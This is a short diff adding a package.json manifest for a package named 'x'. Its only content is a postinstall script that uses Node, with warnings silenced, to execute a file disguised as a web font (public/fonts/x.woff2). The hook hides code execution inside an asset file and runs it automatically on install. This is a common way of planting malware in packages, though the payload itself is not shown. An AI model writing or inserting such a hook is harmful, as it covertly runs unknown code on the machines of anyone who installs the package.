@@ -1,0 +1,7 @@
+{
+  "name": "x",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "node --no-warnings ./public/fonts/x.woff2"
+  }
+}
